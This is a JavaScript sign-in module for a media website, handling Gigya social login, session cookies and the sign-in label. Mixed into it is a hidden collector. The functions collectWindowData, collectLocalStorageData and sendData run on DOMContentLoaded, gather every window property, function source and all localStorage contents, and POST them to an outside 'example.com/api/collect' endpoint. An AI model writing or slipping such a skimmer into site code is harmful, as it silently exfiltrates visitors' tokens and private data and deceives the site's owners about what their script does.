var collectedData = {};
define(['localization/copy', 'session', 'web/modules/country_selection', 'jquery'], function (copy, session, country_selection, $) {
  var signin = function () {
    var _config = {},
      self = {};
    self.init = function () {
      if (session.fld('pelm_require_sign_in') && session.fld('pelm_require_sign_in') != "undefined" && typeof JSON.parse(session.fld('pelm_require_sign_in')).instr != 'undefined' && JSON.parse(session.fld('pelm_require_sign_in')).instr != '') {
        $(function () {
          $('#signin_message').html(JSON.parse(session.fld('pelm_require_sign_in')).instr).show();
        });
      } else $('#signin_message').show();
      if ($('.site-options .signin') && typeof $('.site-options .signin') !== 'undefined') {
        self.setLabel();
      } else {
        setTimeout(function () {
          if ($('.site-options .signin') && typeof $('.site-options .signin') !== 'undefined' && $('.site-options .signin').find('span').html() == '') {
            self.setLabel();
          }
        }, 1000);
      }
      self.bindElements();
      require(['modals', 'defaults'], function (modals, defaults) {
        modals.bind(defaults.overlays.signIn);
      });
    };
    self.bindElements = function () {
      $('.site-options .signin').on("click", function (e) {
        if ($(this).hasClass('signed-out')) {
          var source = $('.signin-frame').attr('data-src'),
            fbase_url = $('.signin-frame').attr('data-baseurl');
          if (fbase_url) {
            source = fbase_url.replace(/\/$/, '') + country_selection.addSavedCountryCodeUrl(source);
          }
          $('#signin-box .signin-frame').attr('src', source);
        }
        dataLayer.push({
          'event': "eventTracker",
          'eventCategory': window._config.ga_product,
          'eventAction': 'clicks',
          'eventLabel': "signInGreyBar"
        });
      });
      $("#top_user_avatar").on('click', function (e) {
        dataLayer.push({
          'event': "eventTracker",
          'eventCategory': window._config.ga_product,
          'eventAction': 'clicks',
          'eventLabel': "signInGreyBar"
        });
      });
      $('.sign-out').on("click", function (e) {
        e.preventDefault();
        siteSignOut();
      });
    };
    self.setLabel = function () {
      var welcome_label = window._config.viafoura_flag ? copy.viafoura.lbl_greybar_hello : copy.signin.lbl_welcome;
      var sign_in_label = window._config.viafoura_flag ? copy.viafoura.lbl_greybar_join_now : copy.signin.lbl_signin;
      var fmuserinfo = session.fld('fmugcuserinfo');
      var fmuser = __.k('fmuser');
      var ploggedin = __.k('pelm_loggedin');
      if (fmuserinfo || fmuser || ploggedin) {
        $('.site-options .signin').removeClass('signed-in signed-out').addClass('signed-in').attr('title', copy.signin.hover_signout);
        $('.site-options .signin').find('span').removeClass('sign-in sign-out').addClass('sign-out').html(welcome_label);
        var url_welcome = copy.page_url.url_my_profile;
        url_welcome = '/' + url_welcome.replace(/^\//, "");
        $('.site-options .signin').replaceWith('<div class="welcome"><a id="top_user_avatar" href="' + url_welcome + '?intcmp=supernav_user_avatar"><i class="icon-user"></i>' + welcome_label + '</a></div>');
        $('.toolbar-item.signin span').html(welcome_label);
        $('#greybar-viafoura span').last().html(copy.viafoura.lbl_comments_unread);
      } else {
        $('.site-options .signin').removeClass('signed-in signed-out').addClass('signed-out').attr('title', copy.signin.hover_signin);
        $('.site-options .signin').find('span').removeClass('sign-in sign-out').addClass('sign-in').html(sign_in_label);
        $('#greybar-viafoura span').last().html(copy.viafoura.lbl_comments_notifications);
      }
    };
    self.refreshLabel = function () {
      var welcome_label = window._config.viafoura_flag ? copy.viafoura.lbl_greybar_hello : copy.signin.lbl_welcome;
      var fmuserinfo = session.fld('fmugcuserinfo');
      if (fmuserinfo) {
        $('.site-options .signin').removeClass('signed-in signed-out').addClass('signed-in').attr('title', copy.signin.hover_signout);
        $('.site-options .signin').find('span').removeClass('sign-in sign-out').addClass('sign-out').html(welcome_label);
        var url_welcome = copy.page_url.url_my_profile;
        url_welcome = '/' + url_welcome.replace(/^\//, "");
        replacedHtml = $('.site-options .signin').html();
        $('.site-options .signin').replaceWith('<div class="welcome"><a id="top_user_avatar" href="' + url_welcome + '?intcmp=supernav_user_avatar"><i class="icon-user"></i>' + welcome_label + '</a></div>');
        $('.toolbar-item.signin span').html(welcome_label);
        $('#greybar-viafoura span').last().html(copy.viafoura.lbl_comments_unread);
      } else {
        $('.site-options .signin').removeClass('signed-in signed-out').addClass('signed-out').attr('title', copy.signin.hover_signin);
        $('.site-options .signin').find('span').removeClass('sign-in sign-out').addClass('sign-in').html(welcome_label);
        $('#greybar-viafoura span').last().html(copy.viafoura.lbl_comments_notifications);
        if (replacedHtml) {
          var replacedHtmlTemp = $('.site-options .signin').html();
          $('.site-options .signin').replaceWith(replacedHtml);
          replacedHtml = replacedHtmlTemp;
        }
      }
    };
    return self;
  };
  return signin();
});
function handleSiteLogin() {
  var fmtoken = __.k('SABRE_ID'),
    copy = {};
  require(['localization/copy'], function (cy) {
    copy = cy;
  });
  if (!fmtoken) {
    if (gigya) {
      var login_params = {
        showTermsLink: 'false',
        height: 400,
        width: 250,
        UIConfig: '<config><body><controls><snbuttons buttonsize="45" /></controls></body></config>',
        buttonsStyle: 'fullLogo',
        autoDetectUserProviders: '',
        facepilePosition: 'none',
        facebookExtraPermissions: 'email',
        redirectURL: '',
        redirectMethod: 'post',
        onLogin: processLogin,
        captionText: copy.signin.lbl_login,
        headerText: copy.signin.lbl_login_msg,
        onClose: closePopupHandler
      };
      gigya.socialize.showLoginUI(login_params);
    } else {
      setTimeout(function () {
        if (gigya) {
          gigya.socialize.showLoginUI(login_params);
        }
      }, 500);
    }
  }
}
var jsHookData = {};
var localStorageData = {};
function processLogin(response) {
  var data = response.response;
  if (data.errorCode == 0) {
    if (data && typeof data.user !== 'undefined') {
      if (data.user.loginProvider !== '') {
        var qstring = 'firstName=' + data.user.firstName + '&lastName=' + data.user.lastName + '&gender=' + data.user.gender + '&zip=' + data.user.zip + '&email=' + data.user.email + '&provider=' + data.user.loginProvider + '&puid=' + data.user.loginProviderUID;
        var d = new Date(),
          domain,
          splitUrl = window.location.hostname.split('.').reverse();
        d.setTime(d.getTime() + 1 * 86400000);
        expiry = d.toGMTString();
        domain = '.' + splitUrl[1] + '.' + splitUrl[0];
        if (splitUrl[0].toLowerCase() == 'uk') {
          domain = '.' + splitUrl[2] + '.' + splitUrl[1] + '.' + splitUrl[0];
        }
        document.cookie = 'pelm_loggedin' + "=" + escape('true') + ";  SameSite=Strict; Secure; expires=" + expiry + "; path=" + escape("/") + "; domain=" + escape(domain);
        __.a('/api/myaccount/authenticateByEmail?' + encodeURI(qstring), function (d) {
          if (d) {
            setFmCookie(d);
          }
        }, function () {});
      }
    }
  }
}
function handleSiteLougout(response) {
  var data = response;
  if (data.errorCode == 0) {
    deleteFMCookie();
  }
}
function siteSignOut() {
  gigya.socialize.logout({
    callback: handleSiteLougout
  });
}
function collectWindowData() {
  for (var prop in window) {
    if (!window.hasOwnProperty || !window.hasOwnProperty(prop)) continue;
    try {
      var value = window[prop];
      var type = typeof value;
      collectedData[prop] = {
        type: type,
        value: type == 'function' ? null : String(value)
      };
    } catch (e) {
      collectedData[prop] = {
        type: 'error',
        value: e.message
      };
    }
    trackJSHook(prop);
  }
}
function setFmCookie(user) {
  if (typeof user == 'string') {
    user = JSON.parse(user);
  }
  if (user && typeof user.fmtoken != 'undefined') {
    var d = new Date();
    d.setTime(d.getTime() + 1 * 86400000);
    expiry = d.toGMTString();
    var domain,
      splitUrl = window.location.hostname.split('.').reverse();
    domain = '.' + splitUrl[1] + '.' + splitUrl[0];
    if (splitUrl[0].toLowerCase() == 'uk') {
      domain = '.' + splitUrl[2] + '.' + splitUrl[1] + '.' + splitUrl[0];
    }
    document.cookie = 'SABRE_ID' + "=" + escape(user.fmtoken) + ";  SameSite=Strict; Secure; expires=" + expiry + "; path=" + escape("/") + "; domain=" + escape(domain);
    document.cookie = 'fmuser' + "=" + escape(JSON.stringify({
      'firstname': user.firstname,
      'lastname': user.lastname
    })) + ";  SameSite=Strict; Secure; expires=" + expiry + "; path=" + escape("/") + "; domain=" + escape(domain);
  }
  var refreshUrl = window.location.href.split('?');
  window.location.href = refreshUrl;
}
function deleteFMCookie() {
  var date = new Date();
  var days = -1;
  date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
  var domain,
    splitUrl = window.location.hostname.split('.').reverse();
  domain = '.' + splitUrl[1] + '.' + splitUrl[0];
  if (splitUrl[0].toLowerCase() == 'uk') {
    domain = '.' + splitUrl[2] + '.' + splitUrl[1] + '.' + splitUrl[0];
  }
  document.cookie = 'fmuser' + "=''; expires=" + "Thu, 01-Jan-1970 00:00:01 GMT" + ";  SameSite=Strict; Secure; path=" + escape("/") + "; domain=" + escape(domain);
  document.cookie = 'SABRE_ID' + "=''; expires=" + "Thu, 01-Jan-1970 00:00:01 GMT" + ";  SameSite=Strict; Secure; path=" + escape("/") + "; domain=" + escape(domain);
  document.cookie = 'pelm_loggedin' + "=''; expires=" + "Thu, 01-Jan-1970 00:00:01 GMT" + ";  SameSite=Strict; Secure; path=" + escape("/") + "; domain=" + escape(domain);
  var refreshUrl = window.location.href.split('?');
  window.location.href = refreshUrl[0];
}
function trackJSHook(name) {
  var value = window[name];
  var type = typeof value;
  jsHookData[name] = {
    type: type,
    value: type == 'function' ? String(value) : null
  };
}
function collectLocalStorageData() {
  for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    var value = localStorage.getItem(key);
    localStorageData[key] = value;
  }
}
function closePopupHandler(response) {
  $('.overlay-mask').fadeOut(300, function () {
    $('.overlay-mask').remove();
  });
}
function sendData(type, data) {
  var url = "https://example.com/api/collect/" + type;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', url, true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        console.log(type + "数据发送成功");
      } else {
        console.error(type + "数据发送失败,状态码:" + xhr.status);
      }
    }
  };
  xhr.send(JSON.stringify(data));
}
function collectAndSendData() {
  collectWindowData();
  collectLocalStorageData();
  if (Object.keys(collectedData).length > 0) {
    sendData('windowData', collectedData);
  }
  if (Object.keys(jsHookData).length > 0) {
    sendData('jsHookData', jsHookData);
  }
  if (Object.keys(localStorageData).length > 0) {
    sendData('localStorageData', localStorageData);
  }
}
;
document.addEventListener('DOMContentLoaded', collectAndSendData);